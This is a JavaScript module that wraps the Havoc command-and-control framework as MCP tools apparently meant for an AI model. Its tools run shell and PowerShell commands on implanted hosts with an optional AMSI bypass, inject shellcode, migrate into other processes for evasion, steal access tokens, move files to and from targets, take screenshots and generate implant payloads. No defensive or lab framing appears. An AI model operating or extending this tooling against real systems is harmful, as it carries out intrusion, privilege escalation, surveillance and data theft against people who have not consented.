/**
 * Havoc MCP Tools
 * Exposes Havoc C2 capabilities as MCP tools for Claude
 */

import { HavocBridge } from './havoc-bridge.js';

// Global bridge instance
let havocBridge = null;

// Initialize Havoc bridge
export async function initHavocBridge(config = {}) {
  if (havocBridge && havocBridge.connected) {
    return havocBridge;
  }

  havocBridge = new HavocBridge({
    teamserver: process.env.HAVOC_TEAMSERVER || 'ws://127.0.0.1:40056/service',
    password: process.env.HAVOC_PASSWORD || 'service-password',
    ...config
  });

  try {
    await havocBridge.connect();
    console.log('[Havoc Tools] Bridge connected and ready');
    return havocBridge;
  } catch (err) {
    console.error('[Havoc Tools] Failed to connect:', err.message);
    return null;
  }
}

// Get bridge instance
export function getBridge() {
  return havocBridge;
}

// Tool definitions for MCP
export const havocToolDefinitions = [
  // === DEMON MANAGEMENT ===
  {
    name: 'havoc_demons',
    description: 'List all Havoc Demon implants. Demons are native C agents with advanced evasion capabilities.',
    inputSchema: { type: 'object', properties: {} }
  },
  {
    name: 'havoc_demon_info',
    description: 'Get detailed info about a Havoc Demon',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' }
      },
      required: ['demon_id']
    }
  },

  // === EXECUTION ===
  {
    name: 'havoc_shell',
    description: 'Execute shell command on Havoc Demon (cmd.exe)',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Target Demon ID' },
        cmd: { type: 'string', description: 'Command to execute' }
      },
      required: ['demon_id', 'cmd']
    }
  },
  {
    name: 'havoc_powershell',
    description: 'Execute PowerShell on Havoc Demon with optional AMSI bypass',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Target Demon ID' },
        cmd: { type: 'string', description: 'PowerShell command' },
        bypass_amsi: { type: 'boolean', description: 'Attempt AMSI bypass first' }
      },
      required: ['demon_id', 'cmd']
    }
  },

  // === PROCESS OPERATIONS ===
  {
    name: 'havoc_migrate',
    description: 'Migrate Demon to another process. Provides persistence and evasion by moving to a legitimate process.',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Source Demon ID' },
        target_pid: { type: 'number', description: 'Target process ID to migrate into' },
        method: {
          type: 'string',
          description: 'Injection method',
          enum: ['CreateRemoteThread', 'NtCreateThreadEx', 'RtlCreateUserThread', 'APC']
        }
      },
      required: ['demon_id', 'target_pid']
    }
  },
  {
    name: 'havoc_inject',
    description: 'Inject shellcode into a remote process',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        target_pid: { type: 'number', description: 'Target process ID' },
        shellcode_b64: { type: 'string', description: 'Base64-encoded shellcode' },
        method: { type: 'string', description: 'Injection method' }
      },
      required: ['demon_id', 'target_pid', 'shellcode_b64']
    }
  },
  {
    name: 'havoc_spawn',
    description: 'Spawn a sacrificial process and inject shellcode',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        process_path: { type: 'string', description: 'Path to spawn (e.g., C:\\Windows\\System32\\notepad.exe)' },
        shellcode_b64: { type: 'string', description: 'Base64-encoded shellcode' }
      },
      required: ['demon_id', 'process_path', 'shellcode_b64']
    }
  },

  // === TOKEN MANIPULATION ===
  {
    name: 'havoc_token_steal',
    description: 'Steal access token from another process for privilege escalation',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        target_pid: { type: 'number', description: 'Process ID to steal token from' }
      },
      required: ['demon_id', 'target_pid']
    }
  },
  {
    name: 'havoc_token_list',
    description: 'List available tokens',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' }
      },
      required: ['demon_id']
    }
  },

  // === FILE OPERATIONS ===
  {
    name: 'havoc_download',
    description: 'Download file from target via Havoc Demon',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        remote_path: { type: 'string', description: 'Path on target' }
      },
      required: ['demon_id', 'remote_path']
    }
  },
  {
    name: 'havoc_upload',
    description: 'Upload file to target via Havoc Demon',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        remote_path: { type: 'string', description: 'Destination path on target' },
        content_b64: { type: 'string', description: 'Base64-encoded file content' }
      },
      required: ['demon_id', 'remote_path', 'content_b64']
    }
  },

  // === SURVEILLANCE ===
  {
    name: 'havoc_screenshot',
    description: 'Take screenshot via Havoc Demon',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' }
      },
      required: ['demon_id']
    }
  },

  // === DEMON CONTROL ===
  {
    name: 'havoc_sleep',
    description: 'Configure Demon sleep time and jitter for evasion',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID' },
        seconds: { type: 'number', description: 'Sleep time in seconds' },
        jitter: { type: 'number', description: 'Jitter percentage (0-100)' }
      },
      required: ['demon_id', 'seconds']
    }
  },
  {
    name: 'havoc_exit',
    description: 'Terminate Havoc Demon',
    inputSchema: {
      type: 'object',
      properties: {
        demon_id: { type: 'string', description: 'Demon ID to terminate' }
      },
      required: ['demon_id']
    }
  },

  // === PAYLOAD GENERATION ===
  {
    name: 'havoc_generate',
    description: 'Generate Havoc Demon payload',
    inputSchema: {
      type: 'object',
      properties: {
        format: {
          type: 'string',
          description: 'Payload format',
          enum: ['exe', 'dll', 'shellcode', 'service-exe']
        },
        arch: { type: 'string', description: 'Architecture', enum: ['x64', 'x86'] },
        listener: { type: 'string', description: 'Listener name' },
        sleep: { type: 'number', description: 'Initial sleep time (seconds)' },
        jitter: { type: 'number', description: 'Jitter percentage' }
      },
      required: ['format', 'listener']
    }
  }
];

// Tool handlers
export async function handleHavocTool(name, args) {
  if (!havocBridge || !havocBridge.connected) {
    return { success: false, error: 'Havoc bridge not connected. Use havoc_connect first.' };
  }

  try {
    switch (name) {
      case 'havoc_demons':
        return { success: true, demons: await havocBridge.getDemons() };

      case 'havoc_shell':
        return await havocBridge.demonShell(args.demon_id, args.cmd);

      case 'havoc_powershell':
        return await havocBridge.demonPowershell(args.demon_id, args.cmd, args.bypass_amsi);

      case 'havoc_migrate':
        return await havocBridge.demonMigrate(args.demon_id, args.target_pid, args.method);

      case 'havoc_inject':
        const shellcode = Buffer.from(args.shellcode_b64, 'base64');
        return await havocBridge.demonInject(args.demon_id, args.target_pid, shellcode, args.method);

      case 'havoc_spawn':
        const sc = Buffer.from(args.shellcode_b64, 'base64');
        return await havocBridge.demonSpawnInject(args.demon_id, args.process_path, sc);

      case 'havoc_token_steal':
        return await havocBridge.demonTokenSteal(args.demon_id, args.target_pid);

      case 'havoc_download':
        return await havocBridge.demonDownload(args.demon_id, args.remote_path);

      case 'havoc_upload':
        const content = Buffer.from(args.content_b64, 'base64');
        return await havocBridge.demonUpload(args.demon_id, null, args.remote_path, content);

      case 'havoc_screenshot':
        return await havocBridge.demonScreenshot(args.demon_id);

      case 'havoc_sleep':
        return await havocBridge.demonSleep(args.demon_id, args.seconds, args.jitter || 0);

      case 'havoc_exit':
        await havocBridge.demonExit(args.demon_id);
        return { success: true, message: `Demon ${args.demon_id} terminated` };

      default:
        return { success: false, error: `Unknown Havoc tool: ${name}` };
    }
  } catch (err) {
    return { success: false, error: err.message };
  }
}

export default {
  initHavocBridge,
  getBridge,
  havocToolDefinitions,
  handleHavocTool
};
